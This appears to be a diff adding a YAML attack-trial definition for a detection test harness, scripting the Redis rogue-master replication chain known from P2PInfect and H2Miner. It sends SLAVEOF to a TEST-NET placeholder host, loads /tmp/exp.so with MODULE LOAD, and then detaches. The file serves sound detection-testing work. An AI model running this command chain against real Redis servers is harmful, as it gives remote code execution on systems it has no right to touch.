@@ -1,0 +1,22 @@
+id: redis-rogue-master
+name: Redis rogue-master module load
+description: 'SLAVEOF a TEST-NET ''rogue master'' and MODULE LOAD a shared object: the P2PInfect / H2Miner replication RCE chain.'
+trial_kind: attack
+target_services:
+- redis
+expected_detection: EXPLOIT_ATTEMPT
+severity: critical
+models: T1190 -> T1105
+steps:
+- service: redis
+  commands:
+  - - PING
+  - - SLAVEOF
+    - 198.51.100.41
+    - '21000'
+  - - MODULE
+    - LOAD
+    - /tmp/exp.so
+  - - SLAVEOF
+    - 'NO'
+    - ONE
